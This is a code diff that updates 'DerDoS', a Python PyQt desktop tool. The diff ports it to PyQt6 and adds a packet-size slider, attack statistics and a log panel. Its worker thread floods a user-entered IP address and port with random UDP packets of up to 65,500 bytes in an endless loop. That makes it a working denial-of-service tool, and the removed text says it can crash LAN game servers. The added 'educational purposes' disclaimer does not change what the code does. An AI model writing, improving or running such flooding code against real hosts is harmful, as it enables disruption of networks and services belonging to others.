@@ -1,167 +1,352 @@
-from PyQt5 import QtCore, QtGui, QtWidgets, QtTest
+from PyQt6 import QtCore, QtGui, QtWidgets
 import socket
 import os
+import threading
+import time
+import sys
 
 class Ui_MainWindow(object):
     def setupUi(self, MainWindow):
         MainWindow.setObjectName("MainWindow")
         MainWindow.setEnabled(True)
-        MainWindow.resize(494, 278)
-        MainWindow.setMinimumSize(QtCore.QSize(494, 278))
-        MainWindow.setMaximumSize(QtCore.QSize(494, 278))
+        MainWindow.resize(700, 450)  # Increased window size
+        MainWindow.setMinimumSize(QtCore.QSize(700, 500))  # Increased minimum size
+        MainWindow.setMaximumSize(QtCore.QSize(900, 700))  # Increased maximum size
         MainWindow.setWindowTitle("DerDoS")
+        
+        # Setup modern styling
+        self.setup_stylesheet(MainWindow)
+        
+        # Setup window icon
         icon = QtGui.QIcon()
-        icon.addPixmap(QtGui.QPixmap("derdos_builder/asset/windows-logo.ico"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
+        icon.addPixmap(QtGui.QPixmap("derdos_builder/asset/windows-logo.ico"), QtGui.QIcon.Mode.Normal, QtGui.QIcon.State.Off)
         MainWindow.setWindowIcon(icon)
-        MainWindow.setLayoutDirection(QtCore.Qt.LeftToRight)
-        MainWindow.setTabShape(QtWidgets.QTabWidget.Rounded)
+        
+        # Main central widget
         self.centralwidget = QtWidgets.QWidget(MainWindow)
         self.centralwidget.setObjectName("centralwidget")
-        self.plainTextEdit = QtWidgets.QPlainTextEdit(self.centralwidget)
-        self.plainTextEdit.setEnabled(False)
-        self.plainTextEdit.setGeometry(QtCore.QRect(170, 10, 311, 211))
-        self.plainTextEdit.setObjectName("plainTextEdit")
-        self.attack = QtWidgets.QPushButton(self.centralwidget)
-        self.attack.setGeometry(QtCore.QRect(10, 170, 141, 31))
-        self.attack.setObjectName("attack")
-        self.attack.setEnabled(True)
-        self.stop = QtWidgets.QPushButton(self.centralwidget)
-        self.stop.setGeometry(QtCore.QRect(10, 200, 141, 31))
-        self.stop.setObjectName("stop")
-        self.stop.setText("Stop")
-        self.stop.setEnabled(False)
-        self.label = QtWidgets.QLabel(self.centralwidget)
-        self.label.setGeometry(QtCore.QRect(10, 230, 141, 21))
-        self.label.setStyleSheet("font: 300 6pt \"Arial\";")
-        self.label.setAlignment(QtCore.Qt.AlignCenter)
-        self.label.setObjectName("label")
-        self.progressBar = QtWidgets.QProgressBar(self.centralwidget)
-        self.progressBar.setGeometry(QtCore.QRect(170, 231, 311, 20))
-        self.progressBar.setProperty("value", 0)
-        self.progressBar.setTextVisible(False)
-        self.progressBar.setObjectName("progressBar")
-        self.layoutWidget = QtWidgets.QWidget(self.centralwidget)
-        self.layoutWidget.setGeometry(QtCore.QRect(10, 10, 144, 151))
-        self.layoutWidget.setObjectName("layoutWidget")
-        self.verticalLayout_4 = QtWidgets.QVBoxLayout(self.layoutWidget)
-        self.verticalLayout_4.setContentsMargins(0, 0, 0, 0)
-        self.verticalLayout_4.setObjectName("verticalLayout_4")
-        self.verticalLayout_3 = QtWidgets.QVBoxLayout()
-        self.verticalLayout_3.setObjectName("verticalLayout_3")
-        self.title_ip = QtWidgets.QLabel(self.layoutWidget)
-        self.title_ip.setStyleSheet("font: 500 14pt \"Arial\";")
-        self.title_ip.setObjectName("title_ip")
-        self.verticalLayout_3.addWidget(self.title_ip)
-        self.ip = QtWidgets.QLineEdit(self.layoutWidget)
+        
+        # Main layout
+        self.main_layout = QtWidgets.QVBoxLayout(self.centralwidget)
+        self.main_layout.setContentsMargins(20, 20, 20, 20)
+        self.main_layout.setSpacing(15)
+        
+        # Content section with input form and output log
+        self.content_layout = QtWidgets.QHBoxLayout()
+        
+        # Left panel - Controls
+        self.control_panel = QtWidgets.QWidget()
+        self.control_layout = QtWidgets.QVBoxLayout(self.control_panel)
+        self.control_layout.setContentsMargins(0, 0, 0, 0)
+        self.control_layout.setSpacing(15)
+        
+        # IP Address input
+        self.ip_group = QtWidgets.QGroupBox("Target IP Address")
+        self.ip_group.setStyleSheet("QGroupBox { font-weight: bold; }")
+        self.ip_layout = QtWidgets.QVBoxLayout(self.ip_group)
+        self.ip = QtWidgets.QLineEdit()
+        self.ip.setPlaceholderText("Enter IPv4 Address")
         self.ip.setObjectName("ip")
-        self.verticalLayout_3.addWidget(self.ip)
-        self.verticalLayout_4.addLayout(self.verticalLayout_3)
-        self.verticalLayout = QtWidgets.QVBoxLayout()
-        self.verticalLayout.setObjectName("verticalLayout")
-        self.title_port = QtWidgets.QLabel(self.layoutWidget)
-        self.title_port.setStyleSheet("font: 500 14pt \"Arial\";")
-        self.title_port.setObjectName("title_port")
-        self.verticalLayout.addWidget(self.title_port)
-        self.port = QtWidgets.QLineEdit(self.layoutWidget)
-        self.port.setText("")
+        self.ip_layout.addWidget(self.ip)
+        self.control_layout.addWidget(self.ip_group)
+        
+        # Port input
+        self.port_group = QtWidgets.QGroupBox("Target Port")
+        self.port_group.setStyleSheet("QGroupBox { font-weight: bold; }")
+        self.port_layout = QtWidgets.QVBoxLayout(self.port_group)
+        self.port = QtWidgets.QLineEdit()
+        self.port.setPlaceholderText("Enter Port Number")
         self.port.setObjectName("port")
-        self.verticalLayout.addWidget(self.port)
-        self.verticalLayout_4.addLayout(self.verticalLayout)
+        self.port_layout.addWidget(self.port)
+        self.control_layout.addWidget(self.port_group)
+        
+        # Packet size control
+        self.packet_group = QtWidgets.QGroupBox("Packet Size (bytes)")
+        self.packet_group.setStyleSheet("QGroupBox { font-weight: bold; }")
+        self.packet_layout = QtWidgets.QVBoxLayout(self.packet_group)
+        self.packet_size = QtWidgets.QSlider(QtCore.Qt.Orientation.Horizontal)
+        self.packet_size.setMinimum(1024)
+        self.packet_size.setMaximum(65500)
+        self.packet_size.setValue(9216)
+        self.packet_size.setTickPosition(QtWidgets.QSlider.TickPosition.TicksBelow)
+        self.packet_size.setTickInterval(8192)
+        self.packet_size_label = QtWidgets.QLabel(f"Size: {self.packet_size.value()}")
+        self.packet_size.valueChanged.connect(lambda v: self.packet_size_label.setText(f"Size: {v}"))
+        self.packet_layout.addWidget(self.packet_size)
+        self.packet_layout.addWidget(self.packet_size_label)
+        self.control_layout.addWidget(self.packet_group)
+        
+        # Stats display
+        self.stats_group = QtWidgets.QGroupBox("Attack Statistics")
+        self.stats_group.setStyleSheet("QGroupBox { font-weight: bold; }")
+        self.stats_layout = QtWidgets.QFormLayout(self.stats_group)
+        self.packets_sent_label = QtWidgets.QLabel("Packets Sent: 0")
+        self.data_sent_label = QtWidgets.QLabel("Data Sent: 0 MB")
+        self.stats_layout.addRow(self.packets_sent_label)
+        self.stats_layout.addRow(self.data_sent_label)
+        self.control_layout.addWidget(self.stats_group)
+        
+        # Buttons
+        self.buttons_layout = QtWidgets.QHBoxLayout()
+        self.attack = QtWidgets.QPushButton("Attack")
+        self.attack.setObjectName("attack")
+        self.attack.setMinimumHeight(70)
+        self.attack.setCursor(QtGui.QCursor(QtCore.Qt.CursorShape.PointingHandCursor))
+        self.stop = QtWidgets.QPushButton("Stop")
+        self.stop.setObjectName("stop")
+        self.stop.setMinimumHeight(70)
+        self.stop.setEnabled(False)
+        self.stop.setCursor(QtGui.QCursor(QtCore.Qt.CursorShape.PointingHandCursor))
+        self.buttons_layout.addWidget(self.attack)
+        self.buttons_layout.addWidget(self.stop)
+        self.control_layout.addLayout(self.buttons_layout)
+        
+        # Credits label below buttons
+        self.label = QtWidgets.QLabel()
+        self.label.setOpenExternalLinks(True)
+        self.label.setObjectName("label")
+        self.label.setAlignment(QtCore.Qt.AlignmentFlag.AlignCenter)
+        self.control_layout.addWidget(self.label)
+        
+        # Push spacer to bottom align controls
+        self.control_layout.addStretch()
+        
+        # Right panel - Log output
+        self.output_panel = QtWidgets.QWidget()
+        self.output_layout = QtWidgets.QVBoxLayout(self.output_panel)
+        self.output_layout.setContentsMargins(0, 0, 0, 0)
+        
+        # Log view
+        self.log_label = QtWidgets.QLabel("Attack Log")
+        self.log_label.setStyleSheet("font-weight: bold;")
+        self.output_layout.addWidget(self.log_label)
+        
+        self.plainTextEdit = QtWidgets.QPlainTextEdit()
+        self.plainTextEdit.setReadOnly(True)
+        self.plainTextEdit.setObjectName("plainTextEdit")
+        self.plainTextEdit.setStyleSheet("background-color: #f8f9fa; border: 1px solid #ddd; border-radius: 4px;")
+        self.output_layout.addWidget(self.plainTextEdit)
+        
+        # Progress bar only (credits moved)
+        self.progress_layout = QtWidgets.QVBoxLayout()
+        self.progressBar = QtWidgets.QProgressBar()
+        self.progressBar.setProperty("value", 0)
+        self.progressBar.setTextVisible(True)
+        self.progressBar.setObjectName("progressBar")
+        self.progressBar.setStyleSheet("QProgressBar { border: 1px solid #ddd; border-radius: 4px; text-align: center; } QProgressBar::chunk { background-color: #5cb85c; }")
+        self.progress_layout.addWidget(self.progressBar)
+        self.output_layout.addLayout(self.progress_layout)
+        
+        # Add panels to main content layout with a 1:2 ratio
+        self.content_layout.addWidget(self.control_panel, 1)
+        self.content_layout.addWidget(self.output_panel, 2)
+        
+        # Add content layout to main layout
+        self.main_layout.addLayout(self.content_layout)
+        
+        # Set central widget
         MainWindow.setCentralWidget(self.centralwidget)
+        
+        # Status bar
         self.statusbar = QtWidgets.QStatusBar(MainWindow)
         self.statusbar.setObjectName("statusbar")
         MainWindow.setStatusBar(self.statusbar)
-        self.actionMade_by_atomic09 = QtWidgets.QAction(MainWindow)
-        self.actionMade_by_atomic09.setObjectName("actionMade_by_atomic09")
-        self.plainTextEdit.setReadOnly(True)
-        self.plainTextEdit.appendPlainText("Welcome to DerDoS v1.1\n")
-        self.ip.setPlaceholderText("IPv4 Address")
-        self.port.setPlaceholderText("Port")
-        self.attack.clicked.connect(self.shoot)
-        self.attack.clicked.connect(self.delay)
-        self.attack.clicked.connect(self.attacking)
-        self.stop.clicked.connect(self.stop_attack)
-
+        
+        # Initialize app
         self.retranslateUi(MainWindow)
         QtCore.QMetaObject.connectSlotsByName(MainWindow)
+        
+        # Connect signals
+        self.attack.clicked.connect(self.shoot)
+        self.stop.clicked.connect(self.stop_attack)
+        
+        # Initialize variables
+        self.packets_sent = 0
+        self.data_sent = 0
+        
+        # Welcome message
+        self.plainTextEdit.appendPlainText("Welcome to DerDoS v1.2\n")
+        self.plainTextEdit.appendPlainText("Enter target IP address and port to begin.\n")
+        self.plainTextEdit.appendPlainText("WARNING: This tool should only be used for educational purposes and network testing. Unauthorized use against networks without permission is illegal.\n")
+
+    def setup_stylesheet(self, MainWindow):
+        """Apply modern stylesheet to the application"""
+        MainWindow.setStyleSheet("""
+            QMainWindow {
+                background-color: #ffffff;
+            }
+            QLineEdit {
+                padding: 8px;
+                border: 1px solid #ddd;
+                border-radius: 4px;
+                background-color: #f8f9fa;
+            }
+            QLineEdit:focus {
+                border: 1px solid #5b9bd5;
+            }
+        """)
 
     def retranslateUi(self, MainWindow):
         _translate = QtCore.QCoreApplication.translate
         self.attack.setText(_translate("MainWindow", "Attack"))
-        self.label.setText(_translate("MainWindow", '<a href="https://github.com/ATOMIC09/DerDoS" style="text-decoration: none;">Made by atomic09 | v1.1</a>'))
-        self.label.setOpenExternalLinks(True)
-        self.title_ip.setText(_translate("MainWindow", "IP Address"))
-        self.title_port.setText(_translate("MainWindow", "Port"))
-        self.actionMade_by_atomic09.setText(_translate("MainWindow", '<a href="https://github.com/ATOMIC09/DerDoS" style="text-decoration: none;">V1.0 | Made by atomic09</a>'))
+        self.stop.setText(_translate("MainWindow", "Stop"))
+        self.label.setText(_translate("MainWindow", '<a href="https://github.com/ATOMIC09/DerDoS" style="text-decoration: none; color: #5b9bd5;">DerDoS v1.2 | Licensed under GPLv3</a>'))
 
     def shoot(self):
+        """Prepare and start the attack"""
         if self.ip.text() == "" or self.port.text() == "":
-            self.plainTextEdit.appendPlainText("Please enter the IP Address and Port\n")
-        else:
+            self.plainTextEdit.appendPlainText("Error: Please enter both IP Address and Port number\n")
+            return
+        
+        try:
+            # Validate port number
+            port_num = int(self.port.text())
+            if port_num < 1 or port_num > 65535:
+                self.plainTextEdit.appendPlainText("Error: Port must be between 1 and 65535\n")
+                return
+                
+            # Validate IP address format
+            socket.inet_aton(self.ip.text())
+            
+            # Disable inputs
             self.ip.setReadOnly(True)
             self.port.setReadOnly(True)
+            self.packet_size.setEnabled(False)
             self.attack.setEnabled(False)
-            self.stop.setEnabled(False)
+            
+            # Get target info
             target_ip = str(self.ip.text())
-            target_port = int(self.port.text())
+            target_port = port_num
+            packet_size = self.packet_size.value()
+            
+            # Store target info
             self.target_ip_global = target_ip
             self.target_port_global = target_port
+            self.packet_size_global = packet_size
+            
+            # Reset stats
+            self.packets_sent = 0
+            self.data_sent = 0
+            self.update_stats()
+            
+            # Update UI
             self.plainTextEdit.clear()
-            self.plainTextEdit.appendPlainText(f"Attacking to {target_ip} with port {target_port}\n")
-            self.plainTextEdit.appendPlainText(("1.This program requires Target's IPv4 and does not have a Firewall.\n2.This program sends data on the UDP protocol.\n3.If you do it on multiple computers, it's called DDoS.\n4.You can cause the local game server (LAN) to crash by DDoS on the game server host.\n\n **DDoS affects your internet bandwidth.**\n"))
-            QtTest.QTest.qWait(2000)
-            self.plainTextEdit.appendPlainText(('Hint: Please check "Send" on Network Adapter in Task Manager\n'))
+            self.plainTextEdit.appendPlainText(f"Attack Details:\n- Target: {target_ip}:{target_port}\n- Packet Size: {packet_size} bytes\n")
+            self.plainTextEdit.appendPlainText("Preparing attack sequence...\n")
+            
+            # Start progress animation
+            self.animate_progress()
+            
+        except ValueError:
+            self.plainTextEdit.appendPlainText("Error: Port must be a number\n")
+        except socket.error:
+            self.plainTextEdit.appendPlainText("Error: Invalid IP address format\n")
 
-    def delay(self, x):
-        if x <= 100 and self.ip.text() != "" and self.port.text() != "":
-            QtTest.QTest.qWait(10)
-            self.progressBar.setValue(x)
-            return self.delay(x+1)
+    def animate_progress(self):
+        """Animate the progress bar before attack starts"""
+        self.progress_thread = ProgressThread(self)
+        self.progress_thread.progress_updated.connect(self.update_progress)
+        self.progress_thread.finished.connect(self.start_attack)
+        self.progress_thread.start()
 
-    def attacking(self):
-        if self.ip.text() != "" and self.port.text() != "":
-            self.worker = WorkerThread(self)
-            self.worker.target_ip = self.target_ip_global
-            self.worker.target_port = self.target_port_global
-            self.worker.start()
-            self.stop.setEnabled(True)
+    def update_progress(self, value):
+        """Update progress bar value"""
+        self.progressBar.setValue(value)
+
+    def start_attack(self):
+        """Start the actual attack after animation"""
+        self.plainTextEdit.appendPlainText("Attack started!\n")
+        self.plainTextEdit.appendPlainText("Sending packets...\n")
+        
+        # Enable stop button
+        self.stop.setEnabled(True)
+        
+        # Start attack thread
+        self.worker = WorkerThread(self)
+        self.worker.start()
+        
+        # Start stats update timer
+        self.stats_timer = QtCore.QTimer()
+        self.stats_timer.timeout.connect(self.update_stats)
+        self.stats_timer.start(1000)  # Update every second
+
+    def update_stats(self):
+        """Update attack statistics display"""
+        if hasattr(self, 'packets_sent'):
+            self.packets_sent_label.setText(f"Packets Sent: {self.packets_sent:,}")
+            self.data_sent_label.setText(f"Data Sent: {self.data_sent / (1024*1024):.2f} MB")
 
     def stop_attack(self):
+        """Stop the attack and reset UI"""
         if hasattr(self, 'worker'):
             self.worker.stop()
+            
+            if hasattr(self, 'stats_timer'):
+                self.stats_timer.stop()
+            
             self.progressBar.setProperty("value", 0)
-            self.plainTextEdit.clear()
-            self.plainTextEdit.appendPlainText("Welcome to DerDoS v1.1\n")
+            self.plainTextEdit.appendPlainText("\nAttack stopped.\n")
+            self.plainTextEdit.appendPlainText("Ready for new target.\n")
+            
+            # Re-enable inputs
             self.ip.setReadOnly(False)
             self.port.setReadOnly(False)
+            self.packet_size.setEnabled(True)
             self.attack.setEnabled(True)
             self.stop.setEnabled(False)
 
+class ProgressThread(QtCore.QThread):
+    """Thread for animating progress bar"""
+    progress_updated = QtCore.pyqtSignal(int)
+    
+    def __init__(self, ui_reference):
+        super().__init__()
+        self.ui_reference = ui_reference
+    
+    def run(self):
+        for i in range(101):
+            self.progress_updated.emit(i)
+            QtCore.QThread.msleep(20)
+
 class WorkerThread(QtCore.QThread):
+    """Thread for sending attack packets"""
     def __init__(self, ui_reference):
         super().__init__()
         self.ui_reference = ui_reference
         self.running = True
+        self.packets_sent = 0
+        self.bytes_sent = 0
 
     def run(self):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            data = os.urandom(9216)
+            data = os.urandom(self.ui_reference.packet_size_global)
+            
             while self.running:
-                s.sendto(data, (self.target_ip, self.target_port))
+                try:
+                    sent = s.sendto(data, (self.ui_reference.target_ip_global, self.ui_reference.target_port_global))
+                    self.packets_sent += 1
+                    self.bytes_sent += sent
+                    
+                    # Update UI stats (thread-safe via attributes)
+                    self.ui_reference.packets_sent = self.packets_sent
+                    self.ui_reference.data_sent = self.bytes_sent
+                    
+                except Exception:
+                    # Skip failed packets
+                    pass
+                    
         except Exception as e:
-            # Print to plainTextEdit
-            self.ui_reference.plainTextEdit.clear()
+            # Print to plainTextEdit (using signals would be better but this is simpler)
             self.ui_reference.plainTextEdit.appendPlainText(f"Error: {e}\n")
 
     def stop(self):
         self.running = False
 
 if __name__ == "__main__":
-    import sys
     app = QtWidgets.QApplication(sys.argv)
     MainWindow = QtWidgets.QMainWindow()
     ui = Ui_MainWindow()
     ui.setupUi(MainWindow)
     MainWindow.show()
-    sys.exit(app.exec_())
+    sys.exit(app.exec())
